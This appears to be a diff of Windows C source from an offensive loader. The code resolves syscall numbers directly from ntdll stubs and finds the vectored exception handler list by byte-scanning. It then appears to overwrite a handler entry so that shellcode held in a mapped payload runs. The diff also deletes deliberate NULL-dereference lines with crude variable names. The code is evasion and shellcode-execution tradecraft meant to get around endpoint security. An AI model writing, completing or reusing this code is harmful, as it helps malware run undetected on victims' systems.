@@ -127,7 +127,6 @@ BOOL InitSys(ULONG Hash, PNT_SYSCALL pNtSys) {
 				&& *((PBYTE)pFunctionAddress + 6) == 0x00
 				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {
 
-				BYTE cock = *((PBYTE)NULL + 69);
 				BYTE high = *((PBYTE)pFunctionAddress + 5);
 				BYTE low = *((PBYTE)pFunctionAddress + 4);
 				pNtSys->dwSSN = (high << 8) | low;
@@ -146,7 +145,6 @@ BOOL InitSys(ULONG Hash, PNT_SYSCALL pNtSys) {
 						&& *((PBYTE)pFunctionAddress + 7 + idx * 32) == 0x00) {
 
 						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * 32);
-						BYTE cock = *((PBYTE)NULL + 69);
 						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * 32);
 						pNtSys->dwSSN = (high << 8) | low - idx;
 						break;
@@ -202,40 +200,29 @@ BOOL InitStuff() {
 	return TRUE;
 }
 
-PVOID HandlerList() {
+PVOID VehList() {
 
-	PBYTE   pNext = NULL;
-	PBYTE   pRtlpAddVectoredHandler = NULL;
-	PBYTE   pVehList = NULL;
-	int     offset = 0;
-	int     i = 1;
+	ULONG64 ptr = (ULONG64)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "RtlRemoveVectoredExceptionHandler");
 
-	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(g_PeStuff.uNtdll, "RtlAddVectoredExceptionHandler");
-
-	if (!pRtlAddVectoredExceptionHandler)
+	if (!ptr)
 		return NULL;
 
-	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;
+	while (*(BYTE*)ptr != 0xcc) {
 
-	while (TRUE) {
+		if (*(BYTE*)ptr == 0xe9) {
 
-		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {
+			ptr = ptr + 5 + *(int*)(ptr + 1);
 
-			if (i == 2) {
-				offset = *(int*)(pRtlpAddVectoredHandler + 3);
-				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
-				pVehList = pNext + offset;
-				return pVehList;
+			while (((*(ULONG*)ptr) & 0xffffff) != 0x258d4c) {
+				ptr = ptr + 1;
 			}
-			else {
-				i++;
-			}
+
+			ptr = ptr + 7 + *(int*)(ptr + 3);
+			return (PVOID)ptr;
 		}
 
-		pRtlpAddVectoredHandler++;
+		ptr = ptr + 1;
 	}
-
-	return NULL;
 }
 
 BOOL Map(PVOID* pPayload) {
@@ -272,7 +259,7 @@ BOOL OverWriteNShit() {
 
 	VECTORED_HANDLER_LIST	handler_list = { 0 };
 	VEH_HANDLER_ENTRY		handler_entry = { 0 };
-	PVOID					pHandlerList = HandlerList();
+	PVOID					pHandlerList = VehList();
 	PVOID					pShellcode = NULL;
 
 	_memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));
